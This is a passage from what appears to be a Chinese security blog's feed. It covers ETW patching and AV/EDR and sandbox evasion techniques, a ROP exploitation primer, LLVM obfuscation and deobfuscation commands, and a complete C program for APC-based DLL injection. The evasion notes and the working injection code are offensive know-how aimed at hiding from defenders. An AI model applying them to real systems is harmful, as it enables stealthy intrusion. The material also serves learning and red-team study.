(LPVOID)pEtwEventWrite, &amp;patch, <span class="keyword">sizeof</span>(<span class="type">char</span>),<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//修改过的内存页的保护属性恢复为修改之前的状态</span></span><br><span class="line">VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="number">1</span>, oldProtect, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="comment">//ResumeThread 恢复 PowerShell 进程的执行</span></span><br><span class="line">ResumeThread(pi.hThread);</span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line"><span class="comment">//FreeLibrary(hNtdll);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过完全禁用并不是最好的想法，当防御者发现一条日志也没有，那也就说明遭到了入侵。我们要做的应该是提供虚假信息或者过滤到我们不想让防御者看到的信息</p><h4 id="调用系统级函数"><a href="#调用系统级函数" class="headerlink" title="调用系统级函数"></a>调用系统级函数</h4><p>直接系统调用是直接对内核系统调用等效的 WINAPI 调用。我们不调用 ntdll.dll VirtualAlloc，而是调用它在 Windows 内核中定义的内核等效 NtAlocateVirtualMemory。这就避免了EDR在用户层对ntdll的检测。</p><p><a href="https://www.outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">红队战术：结合直接系统调用和 sRDI 绕过 AV&#x2F;EDR |包抄 (outflank.nl)</a></p><h4 id="删除或覆盖ntdll里面的hook"><a href="#删除或覆盖ntdll里面的hook" class="headerlink" title="删除或覆盖ntdll里面的hook"></a>删除或覆盖ntdll里面的hook</h4><p><a href="https://github.com/hlldz/RefleXXion">hlldz&#x2F;RefleXXion：RefleXXion 是一个实用程序，旨在帮助绕过 AV&#x2F;EPP&#x2F;EDR 等使用的用户模式钩子。为了绕过用户模式钩子，它首先收集 LdrpThunkSignature 数组中找到的 NtOpenFile、NtCreateSection、NtOpenSection 和 NtMapViewOfSection 的系统调用号。 (github.com)</a></p><p><a href="https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/">EDR 并行分析 - MDSec</a></p><h4 id="欺骗线程调用堆栈"><a href="#欺骗线程调用堆栈" class="headerlink" title="欺骗线程调用堆栈"></a>欺骗线程调用堆栈</h4><p><a href="https://cloud.tencent.com/developer/article/1911354">如何使用ThreadStackSpoofer隐藏Shellcode的内存分配行为-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h4 id="beacon-shellcode-内存加密"><a href="#beacon-shellcode-内存加密" class="headerlink" title="beacon&#x2F;shellcode 内存加密"></a>beacon&#x2F;shellcode 内存加密</h4><p><a href="https://www.freebuf.com/articles/system/361161.html">Sangfor华东天勇战队：内存规避 - FreeBuf网络安全行业门户</a></p><h4 id="不使用RWX内存"><a href="#不使用RWX内存" class="headerlink" title="不使用RWX内存"></a>不使用RWX内存</h4><p><a href="https://www.cnblogs.com/HexNy0a/articles/18011775">无可执行权限加载 ShellCode - HexNy0a - 博客园 (cnblogs.com)</a></p><p>作者的思路就是不将shellcode写入内存，避免检测到shellcode的特征码，接着通过解释器去解释运行shellcode，达到“不见shellcode，执行shellcode”的操作。不过从另一个角度来看，就是将shellcode写入到可读可写可执行的内存中，变为将解释器写入到可读可写可执行的内存中去。</p><h3 id="针对沙箱"><a href="#针对沙箱" class="headerlink" title="针对沙箱"></a>针对沙箱</h3><h4 id="检测虚拟机特征值"><a href="#检测虚拟机特征值" class="headerlink" title="检测虚拟机特征值"></a>检测虚拟机特征值</h4><p>检测是否存在 <code>\\Device\\VBoxGuest</code>设备文件</p><p>检测是否存在设备名包含 VBOX 关键字或者 VMWARE 关键字</p><p>检测虚拟机中特有的进程</p><p>检测是否存在虚拟机特有的注册表键值</p><p>检测是否存在虚拟机特有的文件</p><p>检测系统环境启动时间</p>]]></content>
      
      
      <categories>
          
          <category> bypass </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基础ROP</title>
      <link href="/2023/08/16/Rop/"/>
      <url>/2023/08/16/Rop/</url>
      
        <content type="html"><![CDATA[<p>线下比赛多为AWD，涉及到逆向的知识点很少。为了在线下不坐牢<del>指打开电脑无所事事疯狂偷吃茶歇区零食</del> ，来记录自己学习pwn的入门知识</p><span id="more"></span><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>是一种栈溢出保护机制。在函数返回前会检查一个生成的随机数，如果随机数被垃圾数据覆盖或者被篡改，就会报错。</p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>类似于Windows下的DEP，将内存页改为不可执行。将程序的<code>.text</code>段标记为可执行，而<code>.data、.bss、.rodata</code>以及堆栈区域均标记为不可执行。所以没有办法使用<code>ret2shellcode</code>的方法进行漏洞利用。</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>地址随机化保护。</p><h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>在我的理解中，这就是最简单的漏洞利用方式。</p><p>通过栈溢出修改函数的返回地址，也存在系统调用函数使用，同时系统调用的命令也正好是<code>/bin/sh</code>，获取到shell。</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>当没有系统函数在程序中，我们只能自己写进去一个<code>shellcode</code>去执行。</p><p>通过在栈溢出的垃圾数据中加入<code>shellcode</code>，修改返回地址到shellcode的地址运行即可</p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>当程序加入<code>NX</code>保护，同时没有系统调用函数来使用，就需要这种漏洞利用手法，通过触发<code>0x80</code>号中断进行系统调用。</p><p>思路如下：</p><ul><li>将系统调用的编号存入EAX。例如要调用<code>exec</code>，对应的编号就是<code>0xb</code>。</li><li>将函数的其他参数存入寄存器。例如调用<code>exec</code>,  eax&#x3D;0xb,  ebx&#x3D;&#x2F;bin&#x2F;sh 的地址,  ecx&#x3D;0,  edx&#x3D;0</li><li>触发0x80中断</li></ul><p>如何向寄存器中填入数据？需要利用<code>gadgets</code>（小片段）来实现</p><p>所谓的<code>gadgets</code>就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eax ; ret</span><br></pre></td></tr></table></figure><p>这段代码的作用就是将栈顶的数据弹出给eax，然后再将栈顶的数据作为返回地址返回。</p><p>我们只需要pop出栈顶的数据到对应寄存器中，接着在新的栈顶填入要ret的地址即可，就可以做到这种攻击手法。</p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>当程序中既没有调用<code>system</code>函数也没有<code>/bin/sh</code>字符，同时程序开启NX保护，这个时候就可以考虑使用libc当中的函数，其中封装了常用的函数，比如常用的printf，get函数。在每个libc库中的函数的偏移都是相对的，只要获取到libc的基地址，再加上函数的偏移值，就可以调用该函数。libc库中也存在字符串<code>/bin/sh</code>。需要注意的是不同版本的libc对应的函数偏移与不同。</p><p>如何获取libc基地址？</p><p>首先通过延迟绑定机制获取到<code>got</code>表中的函数真实地址，通过查找对应libc中函数的偏移，使用真实地址减去函数偏移即可获得libc基地址。</p><p>之后通过基地址加上当前版本的函数偏移即可实现调用。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LLVM混淆与去除</title>
      <link href="/2023/08/12/llvm%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8E%BB%E9%99%A4/"/>
      <url>/2023/08/12/llvm%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8E%BB%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<p>国赛遇到了经过控制流平坦化的一道题。今天来记录一下LLVM环境的使用</p><span id="more"></span><h2 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h2><p>关于混淆的环境搭建不再赘述，网上已有不少详细的说明，本篇只来介绍如何使用搭建后的环境。</p><h3 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a>控制流平坦化</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -fla test.cpp -o test1</span><br></pre></td></tr></table></figure><p>可用选项</p><ul><li>-mllvm -fla : 激活控制流平坦化</li><li>-mllvm -split : 激活基本块分割</li><li>-mllvm -split_num&#x3D;3 : 指定基本块分割的数目</li></ul><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -fla -mllvm -split -mllvm -split_num=3 test.cpp -o test_fla</span><br></pre></td></tr></table></figure><h3 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -sub test.cpp -o test2</span><br></pre></td></tr></table></figure><ul><li>-mllvm -sub : 激活指令替代</li><li>-mllvm -sub_loop&#x3D;3 : 混淆次数，这里一个函数会被混淆3次，默认为 1次</li></ul><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -sub -mllvm -sub_loop=3 test.cpp -o test_sub</span><br></pre></td></tr></table></figure><h3 id="控制流伪造"><a href="#控制流伪造" class="headerlink" title="控制流伪造"></a>控制流伪造</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -bcf test.cpp -o test3</span><br></pre></td></tr></table></figure><ul><li>-mllvm -bcf : 激活虚假控制流</li><li>-mllvm -bcf_loop&#x3D;3 : 混淆次数，这里一个函数会被混淆3次，默认为 1</li><li>-mllvm -bcf_prob&#x3D;40 : 每个基本块被混淆的概率，这里每个基本块被混淆的概率为40%，默认为 30 %</li></ul><p>例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40 test.cpp -o test_bcf</span><br></pre></td></tr></table></figure><p>保护全开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -bcf -mllvm -fla -mllvm -sub test.cpp -o test_bcf</span><br></pre></td></tr></table></figure><h2 id="去除"><a href="#去除" class="headerlink" title="去除"></a>去除</h2><h3 id="去除控制流平坦化"><a href="#去除控制流平坦化" class="headerlink" title="去除控制流平坦化"></a>去除控制流平坦化</h3><p>首先进入虚拟python环境中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workon angr_work</span><br></pre></td></tr></table></figure><p>接着在ida查看混淆函数的起始地址</p><p><img src="https://s2.loli.net/2024/04/16/V7vWpSfoRQb9m4j.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/16/V7vWpSfoRQb9m4j.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240416081251488"></p><p>比如我这里的函数起始地址为0x400CB0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 deflat.py -f test1 --addr 0x400CB0</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/04/16/QCBmtwqYxbs6e35.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/16/QCBmtwqYxbs6e35.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240416083906344"></p><p>最后会恢复一个<code>filename_recovered</code>的文件，再次放入ida中查看<img src="https://s2.loli.net/2024/04/16/YAt8ZcLVwS4QCbX.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/16/YAt8ZcLVwS4QCbX.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240416084111340"  /></p><img src="D:/typora/picture/aGJm8rSqp5cYQ7i.png" class="lazyload" data-srcset="D:/typora/picture/aGJm8rSqp5cYQ7i.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240416084153405"  /><h3 id="去除控制流伪造"><a href="#去除控制流伪造" class="headerlink" title="去除控制流伪造"></a>去除控制流伪造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 debogus.py -f test1 --addr 0x400D30</span><br><span class="line">python3 debogus.py -f test1 -s 0x400D30</span><br></pre></td></tr></table></figure><p>这个脚本运行我自己的编译的程序失败了，估计与环境问题有关</p>]]></content>
      
      
      <categories>
          
          <category> 代码保护 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>APC注入</title>
      <link href="/2023/07/20/APC%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/20/APC%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>首先来了解下什么是APC技术。APC全称为异步过程调用，它允许一个线程请求另一个线程在适当的时候异步执行一个特定的函数。通俗来讲，当一个线程调用一个阻塞的系统调用时，例如<code>SleepEx()</code>,<code>WaitForSingleObjectEx()</code>等，内核态返回的时候会检查是否需要执行 apc 。在这种情况下，可以使用APC来在系统调用完成时执行一些额外的代码，而不需要等待系统调用返回。</p><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>适用程序：</p><p>1.多线程程序；</p><p>2.会调用<code>SleepEx()</code>、<code>WaitForSingleObjectEx()</code>、<code>WaitForMultipleObjectsEx()</code>、<code>SignalObjectAndWait()</code>等函数。</p><p>流程：</p><ul><li><p>当EXE里某个线程执行到<code>SleepEx()</code>或者<code>WaitForSingleObjectEx()</code>时，系统就会产生一个软中断。</p></li><li><p>当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p></li><li><p>利用<code>QueueUserAPC()</code>这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>通过快照获取属于目标进程的所有线程，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对应进程Id的所有线程Id</span></span><br><span class="line">BOOL <span class="title function_">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwPid, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//线程ID数组中当前的线程ID数量</span></span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//线程ID数组的最大容量</span></span><br><span class="line">DWORD dwThreadIdListMaxCount = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">//存储线程ID的动态分配数组，通过调用VirtualAlloc分配内存</span></span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">pThreadIdList = (LPDWORD)VirtualAlloc(<span class="literal">NULL</span>, dwThreadIdListMaxCount * <span class="keyword">sizeof</span>(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pThreadIdList == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create Thread Id Space Error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">RtlZeroMemory(&amp;te32, <span class="keyword">sizeof</span>(te32));</span><br><span class="line">te32.dwSize = <span class="keyword">sizeof</span>(te32);</span><br><span class="line">    <span class="comment">//创建系统中所有线程的快照</span></span><br><span class="line">HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hThreadSnapshot == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Create Thread Snap Error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//遍历线程快照，获取每个线程的信息。</span></span><br><span class="line">BOOL bRet = Thread32First(hThreadSnapshot, &amp;te32);</span><br><span class="line"><span class="keyword">while</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//通过比较线程所属进程ID(th32OwnerProcessID)与指定进程ID(dwPid)判断是否与指定进程匹配</span></span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPid)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">            <span class="comment">//如果匹配，则将线程ID te32.th32ThreadID 添加到线程ID数组中</span></span><br><span class="line">pThreadIdList[dwThreadIdListLength++] = te32.th32ThreadID;</span><br><span class="line">&#125;</span><br><span class="line">bRet = Thread32Next(hThreadSnapshot, &amp;te32);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//将线程ID数组的长度 dwThreadIdListLength 和指针 pThreadIdList </span></span><br><span class="line">    <span class="comment">//分别赋值给传入的参数 pThreadIdListLength 和 ppThreadIdList，以便在函数外部访问线程ID数组。</span></span><br><span class="line">*pThreadIdListLength = dwThreadIdListLength;</span><br><span class="line">*ppThreadIdList = pThreadIdList;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//char szDllPath[] = &quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\x64\\Release\\Dll1.dll&quot;;</span></span><br><span class="line"><span class="type">char</span> szDllPath[] = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\Debug\\Dll1&quot;</span>;</span><br><span class="line"><span class="comment">//进程pid</span></span><br><span class="line">    DWORD dwPid = <span class="number">28496</span> ;</span><br><span class="line">BOOL bRet;</span><br><span class="line">    <span class="comment">//所有线程id</span></span><br><span class="line">LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//线程id个数</span></span><br><span class="line">DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//获取当前进程的所有线程</span></span><br><span class="line">bRet = GetAllThreadIdByProcessId(dwPid, &amp;pThreadIdList, &amp;dwThreadIdListLength);</span><br><span class="line"><span class="keyword">if</span> (!bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Get All Thread Id Error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Open Process Error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwDllPathLen = <span class="built_in">strlen</span>(szDllPath) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 申请目标进程空间，用于存储DLL路径</span></span><br><span class="line">LPVOID lpBaseAddress = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lpBaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] VirtualAllocEx Error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">SIZE_T dwWriten = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 把DLL路径字符串写入目标进程</span></span><br><span class="line">WriteProcessMemory(hProcess, lpBaseAddress, szDllPath, dwDllPathLen, &amp;dwWriten);</span><br><span class="line"><span class="keyword">if</span> (dwWriten != dwDllPathLen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Write Process Memory Error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取LoadLibraryA的加载地址</span></span><br><span class="line">LPVOID pLoadLibraryFunc = GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pLoadLibraryFunc == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Get Func Address Error!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 倒序插入线程APC，可避免出现在插入时进程崩溃的现象</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">//线程句柄</span></span><br><span class="line">HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line"><span class="keyword">if</span> (hThread)</span><br><span class="line">&#123;</span><br><span class="line">QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)lpBaseAddress);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">hThread = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; Success\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hProcess)</span><br><span class="line">&#123;</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">hProcess = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pThreadIdList)</span><br><span class="line">&#123;</span><br><span class="line">VirtualFree(pThreadIdList, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">ExitProcess(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行目标注入程序</p><p><img src="https://s2.loli.net/2024/04/28/jbodaXV1vYJcteE.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/28/jbodaXV1vYJcteE.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428155334215"></p><p>运行Dll注入程序</p><p><img src="D:/typora/picture/image-20240428155439734.png" class="lazyload" data-srcset="D:/typora/picture/image-20240428155439734.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428155439734"></p><p>目标进程出现测试Dll</p><p><img src="https://s2.loli.net/2024/04/28/iPeCK2JHUyjxG5v.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/28/iPeCK2JHUyjxG5v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428155439735"></p>]]></content>
      
      
      <categories>
          
          <category> Dll注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>绕过Session0进行注入</title>
      <link href="/2023/07/18/%E7%AA%81%E7%A0%B4Session0%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/18/%E7%AA%81%E7%A0%B4Session0%E7%9A%84%E6%B3%A8%E5%85%A5/</url>
      
